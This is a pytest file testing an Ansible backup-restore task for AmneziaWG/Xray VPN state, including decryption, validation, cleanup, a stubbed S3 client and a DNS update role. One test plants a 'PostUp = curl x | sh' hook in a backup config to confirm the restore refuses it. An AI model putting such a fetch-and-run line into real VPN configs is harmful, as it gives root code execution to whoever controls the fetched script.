"""playbooks/tasks/fetch-backup.yml: decrypt and validate a backup (local source seam)."""
import json
import os
import shutil
import subprocess
import tempfile

import pytest

from test_render import FIXTURE_VAULT_PASS, ROOT

pytestmark = pytest.mark.skipif(shutil.which("age") is None, reason="age not installed")

PLAYBOOK = """---
- hosts: localhost
  connection: local
  gather_facts: false
  tasks:
    - ansible.builtin.include_tasks: {task}
    - ansible.builtin.copy:
        content: "{{{{ entry_restore_archive }}}}"
        dest: {out}/archive-path
        mode: "0600"
    - ansible.builtin.copy:
        content: "{{{{ entry_restore_tmpdir }}}}"
        dest: {out}/tmpdir-path
        mode: "0600"
    - ansible.builtin.copy:
        content: "{{{{ entry_restore_has_xray }}}} {{{{ entry_restore_xray_dir }}}}"
        dest: {out}/xray
        mode: "0600"
"""


def _setup(tmp_path, members, vault_priv="K\n"):
    ident = tmp_path / "id.txt"
    subprocess.run(["age-keygen", "-o", str(ident)], check=True, capture_output=True)
    pub = subprocess.run(["age-keygen", "-y", str(ident)], check=True,
                         capture_output=True, text=True).stdout.strip()
    src = tmp_path / "src"
    for name, data in members.items():
        (src / name).parent.mkdir(parents=True, exist_ok=True)
        (src / name).write_text(data)
    tar = tmp_path / "state.tar"
    # COPYFILE_DISABLE: no AppleDouble ._* members from macOS bsdtar.
    subprocess.run(["tar", "-C", str(src), "-cf", str(tar), "."], check=True,
                   env={**os.environ, "COPYFILE_DISABLE": "1"})
    store = tmp_path / "store"
    store.mkdir()
    name = "entry-20260101T000000Z-abcdef123456.tar.age"
    subprocess.run(["age", "-r", pub, "-o", str(store / name), str(tar)], check=True)
    (store / "latest").write_text(f"bk/{name}")
    varsfile = tmp_path / "vars.json"
    varsfile.write_text(json.dumps({
        "vault_backup_age_identity": ident.read_text(),
        "vault_entry_awg": {"private_key": vault_priv},
        "backup_s3_prefix": "bk",
        "backup_fetch_source": f"local:{store}",
        "entry_awg_port": 51820,
        "entry_awg_subnet": "10.8.1.0/24",
        "entry_xray_enabled": False,
        "entry_xray_port": 443,
    }))
    return varsfile, name


def _run(tmp_path, varsfile, extra=()):
    out = tmp_path / "out"
    out.mkdir(exist_ok=True)
    playbook = tmp_path / "play.yml"
    playbook.write_text(PLAYBOOK.format(task=ROOT / "playbooks/tasks/fetch-backup.yml", out=out))
    env = dict(os.environ)
    if not (ROOT / ".vault-pass").exists():
        env.setdefault("ANSIBLE_VAULT_PASSWORD_FILE", str(FIXTURE_VAULT_PASS))
    env["ANSIBLE_CONFIG"] = str(ROOT / "ansible.cfg")
    proc = subprocess.run(
        ["ansible-playbook", "-i", "localhost,", "-e", "ansible_connection=local",
         "-e", f"@{varsfile}", *extra, str(playbook)],
        cwd=ROOT, env=env, capture_output=True, text=True)
    return proc, out


GOOD_CONF = "[Interface]\nPrivateKey = K\nAddress = 10.8.1.1/24\nListenPort = 51820\n"
GOOD = {"awg0.conf": GOOD_CONF, "wireguard_server_private_key.key": "K\n",
        "clientsTable": "[]\n"}


def test_fetch_latest_decrypts_and_validates(tmp_path):
    varsfile, _ = _setup(tmp_path, GOOD)
    proc, out = _run(tmp_path, varsfile)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    archive = (out / "archive-path").read_text()
    tmpdir = (out / "tmpdir-path").read_text()
    names = subprocess.run(["tar", "-tf", archive], check=True, capture_output=True,
                           text=True).stdout.split()
    assert "./awg0.conf" in names
    assert oct(os.stat(tmpdir).st_mode & 0o777) == "0o700"
    assert "WARNING" not in proc.stdout
    # only the decrypted tar remains; identity temp file is gone
    assert sorted(os.listdir(tmpdir)) == ["backup.tar"]
    shutil.rmtree(tmpdir)


def test_named_object_and_key_mismatch_warns(tmp_path):
    varsfile, name = _setup(tmp_path, GOOD, vault_priv="OTHER\n")
    proc, out = _run(tmp_path, varsfile, ["-e", f"backup_object={name}"])
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "differs from" in proc.stdout
    shutil.rmtree((out / "tmpdir-path").read_text())


def test_archive_without_awg0_conf_fails_and_cleans_up(tmp_path):
    varsfile, _ = _setup(tmp_path, {"wireguard_server_private_key.key": "K\n"})
    before = {p for p in os.listdir(os.environ.get("TMPDIR", "/tmp")) if p.startswith("multihop-restore-")}
    proc, _ = _run(tmp_path, varsfile)
    assert proc.returncode != 0
    assert "not a valid entry backup" in proc.stdout + proc.stderr
    after = {p for p in os.listdir(os.environ.get("TMPDIR", "/tmp")) if p.startswith("multihop-restore-")}
    assert after <= before


def test_backup_with_hook_in_awg0_conf_is_refused_and_cleaned_up(tmp_path):
    # A writer-key holder could plant PostUp (root code execution on restore).
    varsfile, _ = _setup(tmp_path, {**GOOD, "awg0.conf": GOOD_CONF + "PostUp = curl x | sh\n"})
    before = {p for p in os.listdir(os.environ.get("TMPDIR", "/tmp")) if p.startswith("multihop-restore-")}
    proc, _ = _run(tmp_path, varsfile)
    assert proc.returncode != 0
    assert "is refused" in proc.stdout and "'PostUp' is not allowed" in proc.stdout
    after = {p for p in os.listdir(os.environ.get("TMPDIR", "/tmp")) if p.startswith("multihop-restore-")}
    assert after <= before


def test_backup_for_another_port_is_refused(tmp_path):
    varsfile, _ = _setup(tmp_path, GOOD)
    proc, _ = _run(tmp_path, varsfile, ["-e", "entry_awg_port=40000"])
    assert proc.returncode != 0
    assert "ListenPort 51820 != entry_awg_port 40000" in proc.stdout


# --- the entry Xray state under xray/ --------------------------------------------

SERVER_JSON = (ROOT / "tests" / "fixtures" / "amnezia-xray-server.json").read_text()
XRAY = {"xray/server.json": SERVER_JSON,
        "xray/xray_uuid.key": "22222222-2222-4222-8222-222222222222\n",
        "xray/xray_private.key": "eHJheXByaXZhdGVrZXl4cmF5cHJpdmF0ZWtleXhyYXk\n",
        "xray/xray_public.key": "eHJheXB1YmxpY2tleXhyYXlwdWJsaWNrZXl4cmF5cHU\n",
        "xray/xray_short_id.key": "fedcba9876543210\n",
        "xray/clientsTable": "[]\n"}
XRAY_ON = ["-e", "entry_xray_enabled=true"]


def _xray_out(out):
    has, _, path = (out / "xray").read_text().partition(" ")
    return has, path


def test_xray_state_is_staged_for_entry_xray(tmp_path):
    varsfile, _ = _setup(tmp_path, {**GOOD, **XRAY})
    proc, out = _run(tmp_path, varsfile, XRAY_ON)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    has, xray_dir = _xray_out(out)
    tmpdir = (out / "tmpdir-path").read_text()
    assert has == "True" and xray_dir.startswith(tmpdir + "/")
    assert {p: open(os.path.join(xray_dir, p)).read() for p in os.listdir(xray_dir)} == {
        k.split("/", 1)[1]: v for k, v in XRAY.items()}
    assert "NOTICE:" not in proc.stdout
    shutil.rmtree(tmpdir)


def test_xray_less_backup_with_xray_enabled_leaves_seeding_to_entry_xray(tmp_path):
    # Review Focus 3: an old backup restores AWG; entry_xray keeps or seeds its state.
    varsfile, _ = _setup(tmp_path, GOOD)
    proc, out = _run(tmp_path, varsfile, XRAY_ON)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert _xray_out(out) == ("False", "")
    assert "has no Xray state" in proc.stdout
    tmpdir = (out / "tmpdir-path").read_text()
    assert sorted(os.listdir(tmpdir)) == ["backup.tar"]
    shutil.rmtree(tmpdir)


def test_xray_backup_with_xray_disabled_is_skipped_with_a_notice(tmp_path):
    # Another port is fine here: the Xray state is not restored.
    server = SERVER_JSON.replace('"port": 443', '"port": 8443')
    varsfile, _ = _setup(tmp_path, {**GOOD, **XRAY, "xray/server.json": server})
    proc, out = _run(tmp_path, varsfile)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert _xray_out(out) == ("True", "")
    assert "entry_xray_enabled is false" in proc.stdout
    tmpdir = (out / "tmpdir-path").read_text()
    assert sorted(os.listdir(tmpdir)) == ["backup.tar"]
    shutil.rmtree(tmpdir)


@pytest.mark.parametrize("change,needle", [
    (lambda x: {**x, "xray/server.json": SERVER_JSON.replace('"port": 443', '"port": 8443')},
     "xray/server.json port 8443 != entry_xray_port 443"),
    (lambda x: {**x, "xray/server.json": SERVER_JSON.replace('"log"', '"routing": {}, "log"')},
     "section 'routing' is not allowed"),
    (lambda x: {**x, "xray/run.sh": "id\n"}, "not an allowed Xray file"),
])
def test_bad_xray_state_is_refused_and_cleaned_up(tmp_path, change, needle):
    varsfile, _ = _setup(tmp_path, {**GOOD, **change(XRAY)})
    before = _tmp_multihop()
    proc, _ = _run(tmp_path, varsfile, XRAY_ON)
    assert proc.returncode != 0
    assert "is refused" in proc.stdout and needle in proc.stdout, proc.stdout
    assert _tmp_multihop() <= before


# --- production S3 path with a fake `aws` on PATH ---------------------------

FAKE_AWS = r"""#!/usr/bin/env bash
set -eu
[ "$AWS_ACCESS_KEY_ID" = AKTEST ] || { echo "bad access key" >&2; exit 3; }
[ "$AWS_SECRET_ACCESS_KEY" = SKTEST ] || { echo "bad secret" >&2; exit 3; }
[ "$AWS_DEFAULT_REGION" = test-region ] || { echo "bad region" >&2; exit 3; }
[ "$1" = --endpoint-url ] && [ "$2" = https://s3.example.test ] || { echo "bad endpoint" >&2; exit 3; }
[ "$3" = s3 ] && [ "$4" = cp ] || { echo "bad subcommand" >&2; exit 3; }
echo "$*" >> "$FAKE_AWS_LOG"
url="$5"; dest="$6"
case "$url" in s3://bkt/*) key="${url#s3://bkt/}" ;; *) echo "bad bucket" >&2; exit 3 ;; esac
src="$FAKE_AWS_STORE/$key"
[ -f "$src" ] || { echo "An error occurred (NoSuchKey) when calling GetObject: $key" >&2; exit 1; }
if [ "$dest" = - ]; then cat "$src"; else cp "$src" "$dest"; fi
"""


def _s3_setup(tmp_path, members=GOOD):
    varsfile, name = _setup(tmp_path, members)
    cfg = json.loads(varsfile.read_text())
    store = tmp_path / "s3store"
    (store / "bk").mkdir(parents=True)
    for f in (tmp_path / "store").iterdir():
        shutil.copy(f, store / "bk" / f.name)
    cfg.pop("backup_fetch_source")
    cfg.update({
        "backup_s3_endpoint": "https://s3.example.test", "backup_s3_region": "test-region",
        "backup_s3_bucket": "bkt",
        "vault_backup_reader": {"access_key": "AKTEST", "secret_key": "SKTEST"},
    })
    varsfile.write_text(json.dumps(cfg))
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "aws").write_text(FAKE_AWS)
    (bindir / "aws").chmod(0o755)
    log = tmp_path / "aws.log"
    return varsfile, name, bindir, store, log


def _run_s3(tmp_path, varsfile, bindir, store, log, extra=()):
    os.environ["FAKE_AWS_STORE"] = str(store)
    os.environ["FAKE_AWS_LOG"] = str(log)
    old = os.environ["PATH"]
    os.environ["PATH"] = f"{bindir}:{old}"
    try:
        return _run(tmp_path, varsfile, extra)
    finally:
        os.environ["PATH"] = old


@pytest.mark.parametrize("mode", ["latest", "bare", "full"])
def test_s3_path(tmp_path, monkeypatch, mode):
    monkeypatch.setenv("FAKE_AWS_STORE", "")
    varsfile, name, bindir, store, log = _s3_setup(tmp_path)
    extra = {"latest": [], "bare": ["-e", f"backup_object={name}"],
             "full": ["-e", f"backup_object=bk/{name}"]}[mode]
    proc, out = _run_s3(tmp_path, varsfile, bindir, store, log, extra)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    calls = log.read_text().splitlines()
    dl = f"--endpoint-url https://s3.example.test s3 cp s3://bkt/bk/{name} "
    if mode == "latest":
        assert calls[0] == "--endpoint-url https://s3.example.test s3 cp s3://bkt/bk/latest -"
        assert calls[1].startswith(dl)
    else:
        assert len(calls) == 1 and calls[0].startswith(dl)
    assert "AKTEST" not in proc.stdout and "SKTEST" not in proc.stdout
    shutil.rmtree((out / "tmpdir-path").read_text())


def test_s3_error_is_visible_and_cleans_up(tmp_path):
    varsfile, name, bindir, store, log = _s3_setup(tmp_path)
    tmpdirs = lambda: {p for p in os.listdir(tempfile.gettempdir()) if p.startswith("multihop-")}
    before = tmpdirs()
    proc, _ = _run_s3(tmp_path, varsfile, bindir, store, log,
                      ["-e", "backup_object=entry-missing.tar.age"])
    assert proc.returncode != 0
    assert "NoSuchKey" in proc.stdout + proc.stderr
    assert "censored" not in proc.stdout + proc.stderr
    assert tmpdirs() <= before


# --- extra failure cases and identity cleanup -------------------------------

def _tmp_multihop():
    return {p for p in os.listdir(tempfile.gettempdir()) if p.startswith("multihop-")}


def test_success_leaves_no_identity_file(tmp_path):
    varsfile, _ = _setup(tmp_path, GOOD)
    before = _tmp_multihop()
    proc, out = _run(tmp_path, varsfile)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    new = _tmp_multihop() - before
    assert not [p for p in new if p.startswith("multihop-age-id-")]
    shutil.rmtree((out / "tmpdir-path").read_text())


@pytest.mark.parametrize("members", [
    {"awg0.conf": "x\n"},
    {"sub/awg0.conf": "x\n", "sub/wireguard_server_private_key.key": "K\n"},
])
def test_invalid_archives_fail_and_leave_nothing(tmp_path, members):
    varsfile, _ = _setup(tmp_path, members)
    before = _tmp_multihop()
    proc, _ = _run(tmp_path, varsfile)
    assert proc.returncode != 0
    assert "not a valid entry backup" in proc.stdout + proc.stderr
    assert _tmp_multihop() <= before


# --- dns_update ---------------------------------------------------------------

FAKE_DIG = r"""#!/usr/bin/env bash
# usage: dig +short <record> @<resolver>; old IP for the first N calls per resolver
n_file="$FAKE_DIG_DIR/count-${3#@}"
n=$(cat "$n_file" 2>/dev/null || echo 0)
echo $((n + 1)) > "$n_file"
if [ "$n" -lt "$FAKE_DIG_STALE" ]; then echo 192.0.2.1; else echo 203.0.113.9; fi
"""

DNS_PLAYBOOK = """---
- hosts: localhost
  connection: local
  gather_facts: false
  roles:
    - role: dns_update
      dns_record: exit.example.test
      dns_ip: 203.0.113.9
"""


def _dns(tmp_path, stale, retries, with_dig=True):
    bindir = tmp_path / "bin"
    bindir.mkdir()
    if with_dig:
        (bindir / "dig").write_text(FAKE_DIG)
        (bindir / "dig").chmod(0o755)
    digdir = tmp_path / "dig"
    digdir.mkdir()
    playbook = tmp_path / "dns.yml"
    playbook.write_text(DNS_PLAYBOOK)
    env = dict(os.environ)
    # keep real tools (ansible, sh) but make our dir first; hide a real dig when testing absence
    env["PATH"] = f"{bindir}:{os.environ['PATH']}" if with_dig else (
        f"{bindir}:" + ":".join(d for d in os.environ["PATH"].split(":")
                                if not os.path.exists(os.path.join(d, "dig"))))
    env.update(FAKE_DIG_DIR=str(digdir), FAKE_DIG_STALE=str(stale),
               ANSIBLE_CONFIG=str(ROOT / "ansible.cfg"))
    if not (ROOT / ".vault-pass").exists():
        env.setdefault("ANSIBLE_VAULT_PASSWORD_FILE", str(FIXTURE_VAULT_PASS))
    return subprocess.run(
        ["ansible-playbook", "-i", "localhost,", "-e", "ansible_connection=local",
         "-e", f"dns_poll_retries={retries}",
         "-e", "dns_poll_delay=0", str(playbook)],
        cwd=ROOT, env=env, capture_output=True, text=True, stdin=subprocess.DEVNULL)


def test_dns_update_converges(tmp_path):
    proc = _dns(tmp_path, stale=2, retries=5)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "Not waiting for response to prompt" in proc.stdout + proc.stderr  # pause, no TTY
    assert (tmp_path / "dig" / "count-1.1.1.1").read_text().strip() == "3"
    assert (tmp_path / "dig" / "count-8.8.8.8").read_text().strip() == "3"


def test_dns_update_never_converging_fails(tmp_path):
    proc = _dns(tmp_path, stale=999, retries=2)
    assert proc.returncode != 0


def test_dns_update_requires_dig(tmp_path):
    proc = _dns(tmp_path, stale=0, retries=1, with_dig=False)
    if shutil.which("dig", path=os.pathsep.join(
            d for d in os.environ["PATH"].split(":") if os.path.isdir(d)
            and not os.path.exists(os.path.join(d, "dig")))):
        pytest.skip("cannot hide dig")
    assert proc.returncode != 0


HOSTSFILE_PLAYBOOK = """---
- hosts: localhost
  connection: local
  gather_facts: false
  roles:
    - role: dns_update
      dns_backend: hostsfile
      dns_record: exit.example.test
      dns_ip: 203.0.113.9
      dns_hostsfile_path: {path}
"""


def test_dns_update_hostsfile_backend(tmp_path):
    """Lab backend: (re)writes the record into the entry hosts' hosts file, no dig poll."""
    hosts = tmp_path / "hosts"
    hosts.write_text("127.0.0.1 localhost\n192.0.2.1 exit.example.test\n"
                     "192.0.2.7 other.exit.example.test\n")
    playbook = tmp_path / "dns.yml"
    playbook.write_text(HOSTSFILE_PLAYBOOK.format(path=hosts))
    inventory = tmp_path / "inv.yml"
    inventory.write_text("all:\n  children:\n    entry:\n      hosts:\n        localhost:\n"
                         "          ansible_connection: local\n")
    env = dict(os.environ)
    # no dig anywhere on PATH: the hostsfile backend must not need it
    env["PATH"] = ":".join(d for d in os.environ["PATH"].split(":")
                           if not os.path.exists(os.path.join(d, "dig")))
    env["ANSIBLE_CONFIG"] = str(ROOT / "ansible.cfg")
    if not (ROOT / ".vault-pass").exists():
        env.setdefault("ANSIBLE_VAULT_PASSWORD_FILE", str(FIXTURE_VAULT_PASS))
    cmd = [shutil.which("ansible-playbook") or "ansible-playbook", "-i", str(inventory),
           "-e", "ansible_become=false", str(playbook)]
    for _ in range(2):  # second run: unchanged
        proc = subprocess.run(cmd, cwd=ROOT, env=env, capture_output=True, text=True,
                              stdin=subprocess.DEVNULL)
        assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "changed=0" in proc.stdout
    assert hosts.read_text() == ("127.0.0.1 localhost\n203.0.113.9 exit.example.test\n"
                                 "192.0.2.7 other.exit.example.test\n")


def test_dns_update_hostsfile_extra_hosts(tmp_path):
    """dns_hostsfile_hosts widens the pin beyond the entry group (lab VPN client hosts)."""
    hosts = tmp_path / "hosts"
    hosts.write_text("127.0.0.1 localhost\n")
    playbook = tmp_path / "dns.yml"
    playbook.write_text(HOSTSFILE_PLAYBOOK.format(path=hosts))
    inventory = tmp_path / "inv.yml"
    inventory.write_text("all:\n  children:\n    entry: {}\n    lab_client:\n      hosts:\n"
                         "        localhost:\n          ansible_connection: local\n")
    env = dict(os.environ, ANSIBLE_CONFIG=str(ROOT / "ansible.cfg"))
    if not (ROOT / ".vault-pass").exists():
        env.setdefault("ANSIBLE_VAULT_PASSWORD_FILE", str(FIXTURE_VAULT_PASS))
    cmd = [shutil.which("ansible-playbook") or "ansible-playbook", "-i", str(inventory),
           "-e", "ansible_become=false",
           "-e", '{"dns_hostsfile_hosts": "{{ groups.entry + groups.lab_client }}"}', str(playbook)]
    proc = subprocess.run(cmd, cwd=ROOT, env=env, capture_output=True, text=True,
                          stdin=subprocess.DEVNULL)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "203.0.113.9 exit.example.test" in hosts.read_text()
